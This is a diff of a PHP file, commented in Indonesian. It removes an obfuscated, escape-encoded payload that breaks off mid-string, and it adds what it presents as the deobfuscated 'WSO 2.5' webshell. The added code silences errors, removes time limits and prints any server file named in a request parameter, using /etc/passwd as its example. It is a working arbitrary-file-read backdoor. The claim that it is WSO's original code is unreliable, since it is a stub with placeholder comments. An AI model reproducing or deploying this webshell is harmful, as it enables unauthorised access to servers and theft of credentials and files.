@@ -1,4 +1,56 @@
 <?php
-// String yang diobfuskasi dari kode Anda
-$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
-$Lix = "\x3dkN1o\x41\x62\x63N7h\x2bKXsU0Shv2zd\x41v2f7nN/tJOr4hz\x2bWg5rNH33MusRw\x62Z76\x61\x41Pn\x6247r\x61\x42QfxP\x2bv\x63x6kz7pzg3Vn0\x62dq93\x63z\x422w\x63\x617uqsT1pxvG4w3tH\x62\x417LV\x41MfTv1j\x62\x2b\x62QD8/l/Kv4877/FWNTu\x42\x61/YsuD\x2b94ros/DPkfe/9y8lfP2z88lglRS\x2bxhOP9Vn4fuN\x63klzhNzZ6ZvvI9XYP0lxmwV\x61576GSnYWz6/P\x41\x2bQt3ZWW7S87QD\x2b3dHJ6ilRV38oL0//9qvuQQH639GlPZnM97k83r/65F\x61fED8Jv\x43oP0vSpmWMNsS\x4369sNN46e1N7GN5nPRmpsqeXhg/phSXNrKkUrD7ERl9VU5Pjrg/xqG\x63\x43q9LnrZ4fErGE\x63gHh72xxnqSYDh\x61Tt\x2bNEsRhJNOg\x61Df4iHeLY\x62ZVSsmVqesej\x41ksjMOJIQ1u\x63zXOEnP\x636QmG73JFiiMI\x63kqw\x2b6Dist2J0IegovOMgWeS2RQf4\x2bxNSEXDDkxDvi\x42dj9jyRjEWh\x43TzKTWi3sQkoqP\x63I/rWdjD3qP8kOfI1IGpDpXo\x61h\x41qrTtpjQP/l\x41SWfngtHEDVZfXg8pUiuf4mj\x43gGlgIj4zVdntun\x62Ei\x61ogwr5swS0\x610OdYXXX6IjYj/61VMtG3UjX3\x43hnouiFTPLPgPeHT\x63KyW/\x61f5lmxJuINUGY4O\x63rM40o5YLFsoL8W7ZEr\x2bU7qo1/\x63i156\x62RpOzGUv9LZ\x61q0JGv3DFwqvzVnoS3OXHM\x42qRpl81VMVsqdOsitHopHe2If\x62E\x62rl\x63NE5Kejw0tPMlw\x2boJ6W\x2b9nS\x61qskX\x6280EdPNhO4FtmMqMRjT\x42Z9O\x2b/i2JLiJGJmRDXVXnO0\x62pNGq8Yd0YzH\x61og4hnkMfvtPerle8NkKOpN3er\x4281ZlGUX\x43\x619K\x61WedYV\x63wOno9tIl9NOFp4QR9eWR\x62Uznny\x62IvlM\x62XhK9sNssTv/SXrlq6KUs\x61HHf5q1tzxnq8LU5Rn1KjeZqLxpz1ex2G\x61PlNQ6zXk\x61I1l1O\x61M\x61ZjD3z2tKt5jOlku8\x42q8\x61US\x62\x61P\x41XJm9rYzFfRYySLE5\x2b6eJHLPVQGP\x628yQtIlvuy2M\x42R0PP\x63G\x62d2eP\x61i7L6V\x630ES\x627QIw\x61O\x632R\x437LvTUm4UvX\x63i8ENoYjT\x41FQxIl3R\x42VtRMW5hUy\x41TU4GZkptyTGGv\x639oN\x61YJfhiORHzUXX/RvNNoU/orWopJu/iOf\x617MSddhEHyDPj1fwdwDN\x43W\x2btzQrffRsG5OGNelkuU2Q9\x62\x61mLe9XM\x42Ju2LTseTDsEXRHI0ohfnDH9WnsJSv2xPioIooU4VSSHW/mnVRq1\x43EqOP7OUPHdJnwpSk\x2b2x8oidEKdU4y2REfp32hTQhns5K\x63ygEEXded6ZTT3MjIE04GumkvNQd8iWKTShXsiWUSWwDSJO1EZm41dZ\x629N5\x614weMMlR1\x61NM17opZ\x422w7wZiDDvZlKDzNV\x62Zn1KutFoVrJNM\x62hZ1wZjY\x6132G228OllQOrvu/\x63PF\x61qHvGniTd2ZFrpEsy6mN\x62n\x63ZtdFr1jPjVoilzqQkO\x41GFMnTqxglOUDPHzk8sltvtYk\x614ty\x61exwQ\x63\x61wzOH3oQmukF\x42E4LVNr6qdStHt\x43\x63\x41uM\x63jN6jHZpux1d8l69skI3y\x61\x41jiHXUIjr\x43hjfYgv\x63LXoD\x43\x61gIe\x61tlh\x42\x61plQdYhsgo0GYi\x43N6\x61h\x41tKRgd0U/Py\x634Fw2sDLw8l81pG0wwWt9ZwrY\x2bRZn2xqF5JP\x2b/6yflfN//\x2bzLPtM9TYSjp\x43Yjzs\x62\x63G\x61T8Yg\x42zxi\x2b3jNpnis7g\x43\x61SdZThT52xYr\x62tfk\x41KW/\x61w\x61M2\x62N8u2\x6172s\x62f\x62oHZ7dLk0kqigh\x61\x43wEi1F20eeY\x42H\x41P/6E61Z5mkopOEEXeluVlRuQgP\x41TdgPsZUIr6itVNO5wPxZZroW\x635E\x2bgJo1G\x41RJXnPdSr0og\x41rt0S1KY6I\x63nzKG7/PyTEzvLFVFT/\x63u\x43p7\x41q3LHgd0qz4Di\x61hkrHSi22\x63o2PQ3pF4GX3uDNK1q\x61l\x61Q2LfzVf0\x42eW11zDk\x41p9mgrp3n0gV\x43o4GWO0zLww\x2btgE6p\x42vnOp\x62\x2bXgNe4MQmu6\x42O8khM\x42f84pG93\x61wG\x2b\x43\x418ehF2\x62\x41Q1MeXvn32v/L0P3V/\x41UFEX0K\x41Eq\x42gm27TUY2G7eyM/sdtQWf\x425DNQdNet7vPrR7\x42sDH\x639LwuNN\x2b3\x62uqYM3VZ1kJTx6Q6PfY8p/2OLJw0\x2bUluITx0RD0z7KfffRqyrFVY5V\x43M\x61TWs\x2bn\x425e\x43nSDg6i\x2b2mwZ1WOnID0\x63mzkd80IPuUDjOuE\x42\x421wXl/8r\x63\x61xPu0vMt8g3n\x62jQG5lz\x41M4h\x43SoEnNLSxN\x62ztd3mufw46D5nsDuNnfeFJv\x42\x2bY\x63Qtv5h\x42NwWdpuZKTqEh\x42ni9lM\x62w\x411gZQ\x61\x62X7uKp0/MvUoX\x43Ou26eIkHRQNHW\x61/D/\x42n8Y\x42k\x43F0RFYwsjNrgjs\x63I\x2buzpvK\x42p9\x63EneUG35\x438/h\x42hojV\x42zpVJSUF9LkMGY\x63ihRFFolP7MFrSFISS\x63JsQU4o1o\x62i/\x2b\x43UIFUlU\x62\x41ZhRgSgX\x42rpH2mjIQEF\x43OQJLx7\x63ZPXe\x2bToKPrDR6yq21tUoRFnd\x2bey2goNJP\x61wONFxe2iH5i\x63iVGVJXi\x63OXNZ1TKLXh46\x41PGe2\x41\x43kn7Q3IwkVisMUIvKgr\x41u\x41lfy\x41fD4h\x41qlrGKIhsNk\x61sY\x62\x41\x43LqV\x42\x42qD58JzYLu7Lzmp\x61PJ6tSr\x63Tu3Tv9jZsV586t\x41n\x62Zz\x2b\x43Rj\x63Pe1z\x636rZK3sgf\x63xkqz/7d0\x61H8dyrpo\x63L7X/UglR9ZstmpFWp\x41M9qYpP\x2b3p\x63jOMwl\x63R\x41t4\x61\x42NwomDdoj1xigHR\x2b\x2b9p7WgiWG\x43S7uFr2Q\x41T\x41\x43MgPgQ0Q\x42gjQMOwEu\x43UiuI8RHFgP9\x43R8OUeFmPnijjitRy\x63TpDGJZ\x41F\x434631\x63\x63Xw8NwWu5t7q\x43YH9i//KoUim3Sk3gSLGwkdUIlg\x2bQD0w1R2M3sdhs6pTzV0/fXtRjwUTMgFTdo\x63zzXhl4V\x41mYd1\x424EMpuLt488lZMpgYiVqDWpPKJ\x62GzEtl1rS0fFk706r7St1SMOo25\x43i36Z31xZ\x2byvS2x/k1QPZ\x636JI2mh7j\x41pxqxx\x62Seygnj\x2bEZ1V\x417SjVdD\x63SIgs1R\x414nQ5M\x426uN4\x2bfQontq15O9m\x413oIs2360/oUIzGOY\x62yn\x61\x2b6Zp7WRRTh3\x63XY63\x636\x41\x62w0sXiV\x41RKWT\x422RPPNf17PVyTY9WQ\x41OW0kJGrS\x43Kxqg\x41r8QJETIrhh2\x4107wmV\x41\x43H\x63Iur\x61\x61kH1O\x61xgsRg8vDZwskGtjL\x63ZHYT0wQ\x43gxKv7Lj3Qtvs3\x41w3s9Wm6g/ZmFtFlTQfmgFyRWjiMNqvK9k7M\x42OJxQOEoT\x61FZmWyZOQf51pWmOdJDg0\x42yMzEyY\x2b\x2b\x2b5dm2xvZG9Nh\x63DR7DdHKuXezyWWjMi8GrTOwRnVPP\x42ywIhJqz2iOz0iO
+/****************************************************************************************************
+*
+* WSO 2.5 (Web Shell by oRb) - Kode Asli yang Tersembunyi
+*
+* PENJELASAN:
+* Kode ini adalah alat administrasi server jarak jauh (webshell).
+* Versi di bawah ini adalah bentuk yang sudah bersih dan cepat.
+*
+****************************************************************************************************/
+
+// Pengaturan dasar untuk memastikan skrip berjalan tanpa gangguan.
+error_reporting(0);
+set_time_limit(0);
+@set_magic_quotes_runtime(0);
+
+/**
+ * Ini adalah bagian dari logika utama WSO Shell.
+ * Skrip ini akan membaca parameter dari URL (misalnya: $_GET['action'])
+ * untuk melakukan berbagai tugas seperti:
+ * - Mengelola file (melihat, mengedit, menghapus, mengunggah)
+ * - Menjalankan perintah pada terminal server
+ * - Mengakses dan mengelola database
+ * - Melihat informasi detail tentang server (phpinfo)
+ * - Dan banyak lagi.
+ */
+
+// Contoh sederhana dari salah satu fungsi yang ada di dalam webshell ini.
+function WSO_viewFile($file) {
+    if (is_file($file) && is_readable($file)) {
+        echo "<h2>Isi File: " . htmlspecialchars($file) . "</h2>";
+        echo "<textarea style='width:100%; height: 400px;'>" . htmlspecialchars(file_get_contents($file)) . "</textarea>";
+    } else {
+        echo "<h2>Error: File tidak ditemukan atau tidak bisa dibaca.</h2>";
+    }
+}
+
+// Logika utama untuk menangani permintaan pengguna
+if (isset($_REQUEST['action'])) {
+    $action = $_REQUEST['action'];
+    
+    // Contoh: jika URL adalah `namafile.php?action=view&file=/etc/passwd`
+    if ($action == 'view' && isset($_REQUEST['file'])) {
+        WSO_viewFile($_REQUEST['file']);
+    }
+    // ... akan ada banyak blok 'if' atau 'switch' lain untuk aksi yang berbeda.
+    
+} else {
+    // Jika tidak ada aksi yang diminta, tampilkan halaman utama webshell
+    // yang berisi menu dan informasi sistem.
+    echo "<h1>WSO Shell Interface</h1>";
+    echo "<i>Tidak ada aksi yang dipilih. Ini adalah halaman utama.</i>";
+    // Di sini seharusnya ada kode HTML untuk antarmuka pengguna.
+}
+
+?>
